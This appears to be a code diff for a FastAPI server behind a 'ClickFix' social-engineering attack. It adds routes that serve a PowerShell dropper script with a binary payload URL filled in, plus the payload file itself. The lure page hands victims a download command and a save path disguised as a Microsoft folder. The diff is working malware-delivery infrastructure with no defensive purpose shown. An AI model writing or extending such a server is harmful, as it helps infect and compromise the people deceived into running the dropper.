@@ -21,6 +21,29 @@ app.add_middleware(CORSMiddleware,
 
 
 
+@app.get(f"{config.dropperEndpoint}")
+def malserve():
+    with open(config.conf["PATHS"]["dropper"],"r",encoding="utf-8") as powershellscript:
+        PSCode = powershellscript.read()
+    PSCode = PSCode.replace("{{Binary Payload URL}}",config.conf["URLS"]["actual_binary_payload"])
+    return Response(
+        content=PSCode,
+        media_type="text/plain"
+    )
+
+
+
+@app.get(f"{config.binEndpoint}")
+def serveBin():
+    return FileResponse(
+        config.conf["PATHS"]["binary_payload"]
+    )
+
+
+
+
+
+
 
 @app.get("/")
 async def root_route(req:Request):
@@ -31,6 +54,7 @@ async def root_route(req:Request):
     html = html.replace("{{PSScript URL for IWR}}",config.conf["URLS"]["powershell_dropper_url"])
     html = html.replace('{{CLICK_FIX_PAGE}}',config.conf["URLS"]["clickfix_page_endpoint"])
     html = html.replace("{{Payload Save Path In UserDisk}}","C:\\\\MicrosoftSmartBoot")
+    html = html.replace("{{Fav-Icon-URL-Placeholder}}",config.conf["URLS"]["favicon_url"])
     print(html)
     return HTMLResponse(
       html  
@@ -53,5 +77,5 @@ if __name__=="__main__":
     from colorama import init
     init()
     os.system(
-        f"uvicorn {config.socialENGServerFile.replace(".py","")}:app --port {config.DeployedPort()} --host 0.0.0.0 --reload"
+        f"uvicorn {config.ServerFile.replace(".py","")}:app --port {config.DeployedPort()} --host 0.0.0.0 --reload"
     )
